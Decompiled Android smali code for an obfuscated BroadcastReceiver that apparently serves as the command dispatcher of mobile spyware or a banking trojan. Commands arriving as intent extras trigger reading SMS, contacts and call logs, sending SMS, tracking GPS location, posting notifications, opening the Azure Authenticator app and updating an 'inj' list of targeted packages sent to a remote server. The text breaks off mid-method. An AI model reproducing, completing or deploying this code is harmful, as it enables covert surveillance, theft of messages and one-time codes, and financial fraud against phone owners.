.class public final Lf/b0;
.super Landroid/content/BroadcastReceiver;
.source "r8-map-id-7d7ae25efe95319b69974e8de8fecbf659b28a04fb22faa5664366b60d5b8370"


# instance fields
.field public final synthetic a:I

.field public final synthetic b:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(ILjava/lang/Object;)V
    .locals 0

    .line 1
    iput p1, p0, Lf/b0;->a:I

    .line 2
    .line 3
    iput-object p2, p0, Lf/b0;->b:Ljava/lang/Object;

    .line 4
    .line 5
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 18

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    move-object/from16 v0, p2

    .line 4
    .line 5
    iget v2, v1, Lf/b0;->a:I

    .line 6
    .line 7
    const-string v4, "kg"

    .line 8
    .line 9
    const-string v5, "t"

    .line 10
    .line 11
    const-string v6, "a"

    .line 12
    .line 13
    iget-object v7, v1, Lf/b0;->b:Ljava/lang/Object;

    .line 14
    .line 15
    const/4 v8, 0x1

    .line 16
    packed-switch v2, :pswitch_data_0

    .line 17
    .line 18
    .line 19
    const-string v2, "v"

    .line 20
    .line 21
    move-object v10, v7

    .line 22
    check-cast v10, Lcgn/cdfbgd/s;

    .line 23
    .line 24
    invoke-virtual {v0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 25
    .line 26
    .line 27
    move-result-object v7

    .line 28
    const-string v9, "s"

    .line 29
    .line 30
    invoke-virtual {v9, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 31
    .line 32
    .line 33
    move-result v7

    .line 34
    if-eqz v7, :cond_5

    .line 35
    .line 36
    invoke-virtual {v0, v6}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    .line 37
    .line 38
    .line 39
    move-result-object v0

    .line 40
    if-nez v0, :cond_0

    .line 41
    .line 42
    goto/16 :goto_1

    .line 43
    .line 44
    :cond_0
    :try_start_0
    new-instance v7, Le2/c;

    .line 45
    .line 46
    invoke-direct {v7, v0}, Le2/c;-><init>(Ljava/lang/String;)V

    .line 47
    .line 48
    .line 49
    invoke-virtual {v7, v6}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    move-result-object v0

    .line 53
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    .line 54
    .line 55
    .line 56
    move-result v6
    :try_end_0
    .catch Le2/b; {:try_start_0 .. :try_end_0} :catch_0

    .line 57
    const/4 v11, -0x1

    .line 58
    const-string v12, "ic"

    .line 59
    .line 60
    const-string v13, "rl"

    .line 61
    .line 62
    const-string v14, "tx"

    .line 63
    .line 64
    const-string v15, "m"

    .line 65
    .line 66
    const-string v3, "sca"

    .line 67
    .line 68
    sparse-switch v6, :sswitch_data_0

    .line 69
    .line 70
    .line 71
    goto/16 :goto_1

    .line 72
    .line 73
    :sswitch_0
    :try_start_1
    const-string v2, "ssmsc"

    .line 74
    .line 75
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 76
    .line 77
    .line 78
    move-result v0

    .line 79
    if-eqz v0, :cond_5

    .line 80
    .line 81
    invoke-virtual {v7, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object v0

    .line 85
    invoke-virtual {v7, v9}, Le2/c;->d(Ljava/lang/String;)I

    .line 86
    .line 87
    .line 88
    move-result v2

    .line 89
    new-instance v3, Ljava/lang/Thread;

    .line 90
    .line 91
    new-instance v4, Lm0/a;

    .line 92
    .line 93
    invoke-direct {v4, v10, v2, v0, v8}, Lm0/a;-><init>(Ljava/lang/Object;ILjava/lang/Object;I)V

    .line 94
    .line 95
    .line 96
    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 97
    .line 98
    .line 99
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 100
    .line 101
    .line 102
    goto/16 :goto_1

    .line 103
    .line 104
    :catch_0
    move-exception v0

    .line 105
    goto/16 :goto_0

    .line 106
    .line 107
    :sswitch_1
    const-string v2, "notif"

    .line 108
    .line 109
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 110
    .line 111
    .line 112
    move-result v0

    .line 113
    if-eqz v0, :cond_5

    .line 114
    .line 115
    move-object v9, v10

    .line 116
    invoke-virtual {v7, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 117
    .line 118
    .line 119
    move-result-object v10

    .line 120
    invoke-virtual {v7, v14}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 121
    .line 122
    .line 123
    move-result-object v11

    .line 124
    invoke-virtual {v7, v4}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 125
    .line 126
    .line 127
    move-result-object v0

    .line 128
    invoke-virtual {v7, v15}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 129
    .line 130
    .line 131
    move-result-object v2

    .line 132
    invoke-virtual {v7, v13}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 133
    .line 134
    .line 135
    move-result-object v14

    .line 136
    invoke-virtual {v7, v12}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    move-result-object v15

    .line 140
    move-object v12, v0

    .line 141
    move-object v13, v2

    .line 142
    invoke-virtual/range {v9 .. v15}, Lcgn/cdfbgd/s;->f(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 143
    .line 144
    .line 145
    goto/16 :goto_1

    .line 146
    .line 147
    :sswitch_2
    const-string v2, "ssms"

    .line 148
    .line 149
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 150
    .line 151
    .line 152
    move-result v0

    .line 153
    if-eqz v0, :cond_5

    .line 154
    .line 155
    invoke-virtual {v7, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v0

    .line 159
    const-string v2, "n"

    .line 160
    .line 161
    invoke-virtual {v7, v2}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 162
    .line 163
    .line 164
    move-result-object v2

    .line 165
    invoke-virtual {v7, v9}, Le2/c;->d(Ljava/lang/String;)I

    .line 166
    .line 167
    .line 168
    move-result v3

    .line 169
    invoke-virtual {v10, v3, v2, v0}, Lcgn/cdfbgd/s;->e(ILjava/lang/String;Ljava/lang/String;)V

    .line 170
    .line 171
    .line 172
    goto/16 :goto_1

    .line 173
    .line 174
    :sswitch_3
    const-string v2, "sys"

    .line 175
    .line 176
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 177
    .line 178
    .line 179
    move-result v0

    .line 180
    if-eqz v0, :cond_5

    .line 181
    .line 182
    invoke-virtual {v10}, Lcgn/cdfbgd/s;->g()V

    .line 183
    .line 184
    .line 185
    goto/16 :goto_1

    .line 186
    .line 187
    :sswitch_4
    const-string v2, "sms"

    .line 188
    .line 189
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 190
    .line 191
    .line 192
    move-result v0

    .line 193
    if-eqz v0, :cond_5

    .line 194
    .line 195
    const-string v0, "android.permission.READ_SMS"

    .line 196
    .line 197
    invoke-static {v10, v0}, Lq/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 198
    .line 199
    .line 200
    move-result v0

    .line 201
    if-ne v0, v11, :cond_1

    .line 202
    .line 203
    goto/16 :goto_1

    .line 204
    .line 205
    :cond_1
    new-instance v0, Ljava/lang/Thread;

    .line 206
    .line 207
    new-instance v2, Ls0/f;

    .line 208
    .line 209
    const/4 v3, 0x2

    .line 210
    invoke-direct {v2, v10, v3}, Ls0/f;-><init>(Lcgn/cdfbgd/s;I)V

    .line 211
    .line 212
    .line 213
    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 214
    .line 215
    .line 216
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 217
    .line 218
    .line 219
    goto/16 :goto_1

    .line 220
    .line 221
    :sswitch_5
    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 222
    .line 223
    .line 224
    move-result v0

    .line 225
    if-eqz v0, :cond_5

    .line 226
    .line 227
    invoke-virtual {v7, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 228
    .line 229
    .line 230
    move-result-object v0

    .line 231
    invoke-virtual {v7, v14}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 232
    .line 233
    .line 234
    move-result-object v14

    .line 235
    invoke-virtual {v7, v3}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 236
    .line 237
    .line 238
    move-result-object v2

    .line 239
    invoke-virtual {v7, v13}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 240
    .line 241
    .line 242
    move-result-object v11

    .line 243
    invoke-virtual {v7, v12}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 244
    .line 245
    .line 246
    move-result-object v15

    .line 247
    new-instance v3, Ljava/lang/Thread;

    .line 248
    .line 249
    new-instance v9, Ls0/e;

    .line 250
    .line 251
    move-object v13, v0

    .line 252
    move-object v12, v2

    .line 253
    invoke-direct/range {v9 .. v15}, Ls0/e;-><init>(Lcgn/cdfbgd/s;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 254
    .line 255
    .line 256
    invoke-direct {v3, v9}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 257
    .line 258
    .line 259
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 260
    .line 261
    .line 262
    goto/16 :goto_1

    .line 263
    .line 264
    :sswitch_6
    const-string v2, "rsc"

    .line 265
    .line 266
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 267
    .line 268
    .line 269
    move-result v0

    .line 270
    if-eqz v0, :cond_5

    .line 271
    .line 272
    const-string v0, "c"

    .line 273
    .line 274
    invoke-virtual {v7, v0}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 275
    .line 276
    .line 277
    move-result-object v0

    .line 278
    invoke-static {v0}, Lcgn/cdfbgd/s;->d(Ljava/lang/String;)V

    .line 279
    .line 280
    .line 281
    goto/16 :goto_1

    .line 282
    .line 283
    :sswitch_7
    const-string v2, "rlu"

    .line 284
    .line 285
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 286
    .line 287
    .line 288
    move-result v0

    .line 289
    if-eqz v0, :cond_5

    .line 290
    .line 291
    sget-boolean v0, Lcgn/cdfbgd/s;->b:Z

    .line 292
    .line 293
    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    .line 294
    .line 295
    invoke-static {v10, v0}, Lq/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 296
    .line 297
    .line 298
    move-result v0

    .line 299
    if-eqz v0, :cond_2

    .line 300
    .line 301
    goto/16 :goto_1

    .line 302
    .line 303
    :cond_2
    const-string v0, "location"

    .line 304
    .line 305
    invoke-virtual {v10, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 306
    .line 307
    .line 308
    move-result-object v0

    .line 309
    move-object v2, v0

    .line 310
    check-cast v2, Landroid/location/LocationManager;

    .line 311
    .line 312
    iput-object v2, v10, Lcgn/cdfbgd/s;->a:Landroid/location/LocationManager;

    .line 313
    .line 314
    new-instance v7, Ls0/j;

    .line 315
    .line 316
    invoke-direct {v7, v10}, Ls0/j;-><init>(Lcgn/cdfbgd/s;)V
    :try_end_1
    .catch Le2/b; {:try_start_1 .. :try_end_1} :catch_0

    .line 317
    .line 318
    .line 319
    :try_start_2
    const-string v3, "gps"

    .line 320
    .line 321
    const-wide/16 v4, 0x7530

    .line 322
    .line 323
    const/4 v6, 0x0

    .line 324
    invoke-virtual/range {v2 .. v7}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 325
    .line 326
    .line 327
    goto/16 :goto_1

    .line 328
    .line 329
    :catch_1
    move-exception v0

    .line 330
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 331
    .line 332
    .line 333
    goto/16 :goto_1

    .line 334
    .line 335
    :sswitch_8
    const-string v2, "ide"

    .line 336
    .line 337
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 338
    .line 339
    .line 340
    move-result v0

    .line 341
    if-eqz v0, :cond_5

    .line 342
    .line 343
    invoke-virtual {v7, v5}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 344
    .line 345
    .line 346
    move-result-object v0

    .line 347
    invoke-virtual {v7, v14}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 348
    .line 349
    .line 350
    move-result-object v15

    .line 351
    invoke-virtual {v7, v3}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 352
    .line 353
    .line 354
    move-result-object v2

    .line 355
    const-string v3, "l"

    .line 356
    .line 357
    invoke-virtual {v7, v3}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 358
    .line 359
    .line 360
    move-result-object v3

    .line 361
    invoke-virtual {v7, v13}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 362
    .line 363
    .line 364
    move-result-object v11

    .line 365
    invoke-virtual {v7, v12}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 366
    .line 367
    .line 368
    move-result-object v16

    .line 369
    new-instance v4, Ljava/lang/Thread;

    .line 370
    .line 371
    new-instance v9, Ls0/d;

    .line 372
    .line 373
    move-object v14, v0

    .line 374
    move-object v12, v2

    .line 375
    move-object v13, v3

    .line 376
    invoke-direct/range {v9 .. v16}, Ls0/d;-><init>(Lcgn/cdfbgd/s;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 377
    .line 378
    .line 379
    invoke-direct {v4, v9}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 380
    .line 381
    .line 382
    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    .line 383
    .line 384
    .line 385
    goto/16 :goto_1

    .line 386
    .line 387
    :sswitch_9
    const-string v2, "gsi"

    .line 388
    .line 389
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 390
    .line 391
    .line 392
    move-result v0

    .line 393
    if-eqz v0, :cond_5

    .line 394
    .line 395
    invoke-virtual {v10}, Lcgn/cdfbgd/s;->b()V

    .line 396
    .line 397
    .line 398
    goto/16 :goto_1

    .line 399
    .line 400
    :sswitch_a
    const-string v2, "gai"

    .line 401
    .line 402
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 403
    .line 404
    .line 405
    move-result v0

    .line 406
    if-eqz v0, :cond_5

    .line 407
    .line 408
    invoke-virtual {v10}, Lcgn/cdfbgd/s;->a()V

    .line 409
    .line 410
    .line 411
    goto/16 :goto_1

    .line 412
    .line 413
    :sswitch_b
    const-string v2, "cts"

    .line 414
    .line 415
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 416
    .line 417
    .line 418
    move-result v0

    .line 419
    if-eqz v0, :cond_5

    .line 420
    .line 421
    const-string v0, "android.permission.READ_CONTACTS"

    .line 422
    .line 423
    invoke-static {v10, v0}, Lq/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 424
    .line 425
    .line 426
    move-result v0

    .line 427
    if-ne v0, v11, :cond_3

    .line 428
    .line 429
    goto/16 :goto_1

    .line 430
    .line 431
    :cond_3
    new-instance v0, Ljava/lang/Thread;

    .line 432
    .line 433
    new-instance v2, Ls0/f;

    .line 434
    .line 435
    invoke-direct {v2, v10, v8}, Ls0/f;-><init>(Lcgn/cdfbgd/s;I)V

    .line 436
    .line 437
    .line 438
    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 439
    .line 440
    .line 441
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 442
    .line 443
    .line 444
    goto/16 :goto_1

    .line 445
    .line 446
    :sswitch_c
    const-string v2, "cls"

    .line 447
    .line 448
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 449
    .line 450
    .line 451
    move-result v0

    .line 452
    if-eqz v0, :cond_5

    .line 453
    .line 454
    const-string v0, "android.permission.READ_CALL_LOG"

    .line 455
    .line 456
    invoke-static {v10, v0}, Lq/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 457
    .line 458
    .line 459
    move-result v0

    .line 460
    if-ne v0, v11, :cond_4

    .line 461
    .line 462
    goto :goto_1

    .line 463
    :cond_4
    new-instance v0, Ljava/lang/Thread;

    .line 464
    .line 465
    new-instance v2, Ls0/f;

    .line 466
    .line 467
    const/4 v3, 0x0

    .line 468
    invoke-direct {v2, v10, v3}, Ls0/f;-><init>(Lcgn/cdfbgd/s;I)V

    .line 469
    .line 470
    .line 471
    invoke-direct {v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 472
    .line 473
    .line 474
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 475
    .line 476
    .line 477
    goto :goto_1

    .line 478
    :sswitch_d
    const-string v2, "als"

    .line 479
    .line 480
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 481
    .line 482
    .line 483
    move-result v0

    .line 484
    if-eqz v0, :cond_5

    .line 485
    .line 486
    invoke-virtual {v10}, Lcgn/cdfbgd/s;->c()V

    .line 487
    .line 488
    .line 489
    goto :goto_1

    .line 490
    :sswitch_e
    const-string v2, "ca"

    .line 491
    .line 492
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 493
    .line 494
    .line 495
    move-result v0

    .line 496
    if-eqz v0, :cond_5

    .line 497
    .line 498
    const-string v0, "cId"

    .line 499
    .line 500
    invoke-virtual {v7, v0}, Le2/c;->d(Ljava/lang/String;)I

    .line 501
    .line 502
    .line 503
    move-result v0

    .line 504
    new-instance v2, Ljava/lang/Thread;

    .line 505
    .line 506
    new-instance v3, Ls0/h;

    .line 507
    .line 508
    invoke-direct {v3, v1, v0}, Ls0/h;-><init>(Lf/b0;I)V

    .line 509
    .line 510
    .line 511
    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 512
    .line 513
    .line 514
    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    .line 515
    .line 516
    .line 517
    goto :goto_1

    .line 518
    :sswitch_f
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 519
    .line 520
    .line 521
    move-result v0

    .line 522
    if-eqz v0, :cond_5

    .line 523
    .line 524
    invoke-virtual {v7, v2}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 525
    .line 526
    .line 527
    move-result-object v0

    .line 528
    invoke-virtual {v7, v15}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 529
    .line 530
    .line 531
    move-result-object v3
    :try_end_3
    .catch Le2/b; {:try_start_3 .. :try_end_3} :catch_0

    .line 532
    :try_start_4
    new-instance v4, Landroid/content/Intent;

    .line 533
    .line 534
    invoke-virtual {v10}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 535
    .line 536
    .line 537
    move-result-object v5

    .line 538
    const-class v6, Lcgn/cdfbgd/v;

    .line 539
    .line 540
    invoke-direct {v4, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 541
    .line 542
    .line 543
    invoke-virtual {v4, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 544
    .line 545
    .line 546
    invoke-virtual {v4, v15, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 547
    .line 548
    .line 549
    invoke-virtual {v10, v4}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 550
    .line 551
    .line 552
    goto :goto_1

    .line 553
    :catch_2
    move-exception v0

    .line 554
    :try_start_5
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_5
    .catch Le2/b; {:try_start_5 .. :try_end_5} :catch_0

    .line 555
    .line 556
    .line 557
    goto :goto_1

    .line 558
    :goto_0
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 559
    .line 560
    .line 561
    :cond_5
    :goto_1
    return-void

    .line 562
    :pswitch_0
    const-string v2, "li"

    .line 563
    .line 564
    const-string v3, "mac"

    .line 565
    .line 566
    check-cast v7, Lcgn/cdfbgd/a;

    .line 567
    .line 568
    iget-object v9, v7, Lcgn/cdfbgd/a;->e:Ljava/util/HashSet;

    .line 569
    .line 570
    const-string v10, "as"

    .line 571
    .line 572
    invoke-virtual {v0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    .line 573
    .line 574
    .line 575
    move-result-object v11

    .line 576
    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 577
    .line 578
    .line 579
    move-result v10

    .line 580
    if-eqz v10, :cond_11

    .line 581
    .line 582
    :try_start_6
    new-instance v10, Le2/c;

    .line 583
    .line 584
    const-string v11, "of"

    .line 585
    .line 586
    invoke-virtual {v0, v11}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    .line 587
    .line 588
    .line 589
    move-result-object v0

    .line 590
    invoke-direct {v10, v0}, Le2/c;-><init>(Ljava/lang/String;)V

    .line 591
    .line 592
    .line 593
    invoke-virtual {v10, v6}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 594
    .line 595
    .line 596
    move-result-object v0

    .line 597
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    .line 598
    .line 599
    .line 600
    move-result v11
    :try_end_6
    .catch Le2/b; {:try_start_6 .. :try_end_6} :catch_8

    .line 601
    const/16 v12, 0xd25

    .line 602
    .line 603
    const-string v13, "url"

    .line 604
    .line 605
    const-string v14, "set"

    .line 606
    .line 607
    const-string v15, "inj"

    .line 608
    .line 609
    const-string v8, "pkg"

    .line 610
    .line 611
    const-string v1, "id"

    .line 612
    .line 613
    if-eq v11, v12, :cond_10

    .line 614
    .line 615
    const/16 v12, 0xd7d

    .line 616
    .line 617
    move-object/from16 v17, v6

    .line 618
    .line 619
    const/high16 v6, 0x10000000

    .line 620
    .line 621
    if-eq v11, v12, :cond_b

    .line 622
    .line 623
    const/16 v2, 0xe61

    .line 624
    .line 625
    if-eq v11, v2, :cond_a

    .line 626
    .line 627
    const v2, 0x197ed

    .line 628
    .line 629
    .line 630
    if-eq v11, v2, :cond_9

    .line 631
    .line 632
    const v1, 0x1a54f

    .line 633
    .line 634
    .line 635
    if-eq v11, v1, :cond_8

    .line 636
    .line 637
    const v1, 0x1be31

    .line 638
    .line 639
    .line 640
    if-eq v11, v1, :cond_7

    .line 641
    .line 642
    :cond_6
    :goto_2
    move-object/from16 v5, p0

    .line 643
    .line 644
    goto/16 :goto_5

    .line 645
    .line 646
    :cond_7
    :try_start_7
    const-string v1, "str"

    .line 647
    .line 648
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 649
    .line 650
    .line 651
    move-result v0

    .line 652
    if-eqz v0, :cond_6

    .line 653
    .line 654
    const/4 v3, 0x0

    .line 655
    iput-boolean v3, v7, Lcgn/cdfbgd/a;->c:Z

    .line 656
    .line 657
    goto :goto_2

    .line 658
    :catch_3
    move-exception v0

    .line 659
    move-object/from16 v5, p0

    .line 660
    .line 661
    goto/16 :goto_4

    .line 662
    .line 663
    :cond_8
    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 664
    .line 665
    .line 666
    move-result v0

    .line 667
    if-eqz v0, :cond_6

    .line 668
    .line 669
    iget-object v0, v7, Lcgn/cdfbgd/a;->d:Ljava/util/ArrayList;

    .line 670
    .line 671
    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 672
    .line 673
    .line 674
    invoke-virtual {v7}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 675
    .line 676
    .line 677
    move-result-object v0

    .line 678
    const-string v1, "com.azure.authenticator"

    .line 679
    .line 680
    invoke-static {v0, v1}, La0/n;->w(Landroid/content/Context;Ljava/lang/String;)Landroid/content/Intent;

    .line 681
    .line 682
    .line 683
    move-result-object v0

    .line 684
    invoke-virtual {v0, v6}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 685
    .line 686
    .line 687
    invoke-virtual {v7, v0}, Lcgn/cdfbgd/a;->a(Landroid/content/Intent;)V

    .line 688
    .line 689
    .line 690
    goto :goto_2

    .line 691
    :cond_9
    const-string v2, "inr"

    .line 692
    .line 693
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 694
    .line 695
    .line 696
    move-result v0

    .line 697
    if-eqz v0, :cond_6

    .line 698
    .line 699
    invoke-virtual {v10, v8}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 700
    .line 701
    .line 702
    move-result-object v0

    .line 703
    invoke-virtual {v9, v0}, Ljava/util/HashSet;->remove(Ljava/lang/Object;)Z
    :try_end_7
    .catch Le2/b; {:try_start_7 .. :try_end_7} :catch_3

    .line 704
    .line 705
    .line 706
    :try_start_8
    new-instance v0, Le2/c;

    .line 707
    .line 708
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 709
    .line 710
    .line 711
    sget-object v2, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 712
    .line 713
    invoke-virtual {v0, v1, v2}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 714
    .line 715
    .line 716
    new-instance v1, Le2/a;

    .line 717
    .line 718
    invoke-direct {v1, v9}, Le2/a;-><init>(Ljava/util/Collection;)V

    .line 719
    .line 720
    .line 721
    invoke-virtual {v0, v15, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 722
    .line 723
    .line 724
    sget-object v1, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 725
    .line 726
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 727
    .line 728
    .line 729
    move-result-object v0

    .line 730
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 731
    .line 732
    .line 733
    move-result-object v0

    .line 734
    invoke-virtual {v1, v14, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    .line 735
    .line 736
    .line 737
    goto :goto_2

    .line 738
    :catch_4
    move-exception v0

    .line 739
    :try_start_9
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 740
    .line 741
    .line 742
    goto :goto_2

    .line 743
    :cond_a
    const-string v1, "st"

    .line 744
    .line 745
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 746
    .line 747
    .line 748
    move-result v0

    .line 749
    if-eqz v0, :cond_6

    .line 750
    .line 751
    const-string v0, "socket"

    .line 752
    .line 753
    invoke-virtual {v10, v0}, Le2/c;->e(Ljava/lang/String;)Ljava/lang/String;

    .line 754
    .line 755
    .line 756
    move-result-object v0

    .line 757
    iput-object v0, v7, Lcgn/cdfbgd/a;->g:Ljava/lang/String;

    .line 758
    .line 759
    const/4 v0, 0x1

    .line 760
    iput-boolean v0, v7, Lcgn/cdfbgd/a;->c:Z

    .line 761
    .line 762
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 763
    .line 764
    const/16 v1, 0x1e

    .line 765
    .line 766
    if-lt v0, v1, :cond_6

    .line 767
    .line 768
    invoke-virtual {v7}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 769
    .line 770
    .line 771
    move-result-object v0

    .line 772
    invoke-static {v0}, La0/k;->m(Landroid/content/Context;)Ljava/util/concurrent/Executor;

    .line 773
    .line 774
    .line 775
    move-result-object v0

    .line 776
    new-instance v1, Ls0/b;

    .line 777
    .line 778
    invoke-direct {v1, v7}, Ls0/b;-><init>(Lcgn/cdfbgd/a;)V

    .line 779
    .line 780
    .line 781
    invoke-static {v7, v0, v1}, La0/j1;->e(Lcgn/cdfbgd/a;Ljava/util/concurrent/Executor;Ls0/b;)V

    .line 782
    .line 783
    .line 784
    goto/16 :goto_2

    .line 785
    .line 786
    :cond_b
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 787
    .line 788
    .line 789
    move-result v0

    .line 790
    if-eqz v0, :cond_6

    .line 791
